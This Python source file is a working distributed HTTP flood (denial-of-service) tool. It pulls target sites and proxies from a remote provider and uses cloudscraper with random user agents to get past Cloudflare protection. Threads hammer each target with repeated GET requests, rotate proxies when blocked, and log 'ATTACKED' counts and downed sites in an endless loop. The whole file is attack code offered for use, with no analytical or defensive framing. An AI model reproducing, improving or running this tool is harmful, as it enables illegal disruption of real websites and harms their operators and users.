import json
import os
import platform

from argparse import ArgumentParser
from concurrent.futures import ThreadPoolExecutor, as_completed
from gc import collect
from os import system
from sys import stderr
from threading import Thread
from time import sleep
from random import choice

import cloudscraper
from loguru import logger
from pyuseragents import random as random_useragent
from requests.exceptions import ConnectionError
from urllib3 import disable_warnings

import settings
from RemoteProvider import RemoteProvider

disable_warnings()

parser = ArgumentParser()
parser.add_argument('threads', nargs='?', default=settings.DEFAULT_THREADS)
parser.add_argument("-n", "--no-clear", dest="no_clear", action='store_true')
parser.add_argument("-p", "--proxy-view", dest="proxy_view", action='store_true')
parser.add_argument("-t", "--targets", dest="targets", nargs='+', default=[])
parser.set_defaults(verbose=False)
parser.add_argument("-lo", "--logger-output", dest="logger_output")
parser.add_argument("-lr", "--logger-results", dest="logger_results")
parser.set_defaults(no_clear=False)
parser.set_defaults(proxy_view=False)
parser.set_defaults(logger_output=stderr)
parser.set_defaults(logger_results=stderr)
args, unknown = parser.parse_known_args()
no_clear = args.no_clear
proxy_view = args.proxy_view

remoteProvider = RemoteProvider(args.targets)
threads = int(args.threads)
executor = ThreadPoolExecutor(max_workers=threads)

site_is_down = []

logger.remove()
logger.add(
    args.logger_output,
    format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> |\
 <white>thread:</white><green>{thread}</green> | <cyan>{line}</cyan> - <white>{message}</white>")
# logger.add(
#     args.logger_results,
#     format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> |\
#         <cyan>{line}</cyan> - <white>{message}</white>",
#     level="SUCCESS")


def check_req():
    os.system("python3 -m pip install -r requirements.txt")
    os.system("python -m pip install -r requirements.txt")
    os.system("pip install -r requirements.txt")
    os.system("pip3 install -r requirements.txt")


def mainth(site: str):
    global site_is_down
    result = 'processing'
    scraper = cloudscraper.create_scraper(
        browser=settings.BROWSER, )
    scraper.headers.update(
        {'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(),
         'Connection': 'keep-alive',
         'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https',
         'Accept-Encoding': 'gzip, deflate, br'})

    logger.info("STARTING ATTACK TO " + site)

    attacks_number = 0

    try:
        attack = scraper.get(site, timeout=settings.READ_TIMEOUT)

        if attack.status_code >= 302:
            for proxy in remoteProvider.get_proxies():
                if proxy_view:
                    logger.info('USING PROXY:' + proxy["ip"] + " " + proxy["auth"])
                scraper.proxies.update(
                    {'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
                response = scraper.get(site, timeout=settings.READ_TIMEOUT)
                if 200 <= response.status_code <= 302:
                    if site in site_is_down:
                        site_is_down.remove(site)
                    while (attacks_number < settings.MAX_REQUESTS_TO_SITE):
                        response = scraper.get(site, timeout=settings.READ_TIMEOUT)
                        if response.status_code >= 400:
                            break
                        attacks_number += 1
                    logger.critical(f"ATTACKED {site}; attack count: {attacks_number}; RESPONSE CODE: {response.status_code}")
        else:
            if site in site_is_down:
                site_is_down.remove(site)
            while (attacks_number < settings.MAX_REQUESTS_TO_SITE):
                response = scraper.get(site, timeout=settings.READ_TIMEOUT)
                if response.status_code >= 400:
                    break
                attacks_number += 1
            logger.critical(f"ATTACKED {site}; attack count: {attacks_number}; RESPONSE CODE: {response.status_code}")
        if attacks_number > 0:
            logger.critical("SUCCESSFUL ATTACKS on " + site + ": " + str(attacks_number))
        del attack
        # when thread finishes, add new task to executor
        executor.submit(mainth, select_site())
    except ConnectionError as exc:
        logger.success(f"{site} is down")
        if site not in site_is_down:
            site_is_down.append(site)
        # when thread finishes, add new task to executor
        executor.submit(mainth, select_site())
    except Exception as exc:
        logger.warning(f"issue happened: {exc}, SUCCESSFUL ATTACKS: {attacks_number}")
        # when thread finishes, add new task to executor
        executor.submit(mainth, select_site())
    finally:
        del scraper
        collect()
        return mainth(select_site())

def select_site():
    global site_is_down
    new_site = choice(remoteProvider.get_target_sites())
    if len(site_is_down) == len(remoteProvider.get_target_sites()):
        return new_site
    while new_site in site_is_down:
        new_site = choice(remoteProvider.get_target_sites())
    return new_site

def clear():
    if platform.system() == "Linux":
        return system('clear')
    else:
        return system('cls')


def cleaner():
    while True:
        sleep(60)
        if not no_clear:
            clear()
        collect()


if __name__ == '__main__':
    if not no_clear:
        clear()
    #check_req()
    Thread(target=cleaner, daemon=True).start()
    sites = remoteProvider.get_target_sites()
    # initially start as many tasks as configured threads
    for _ in range(threads):
        executor.submit(mainth, select_site())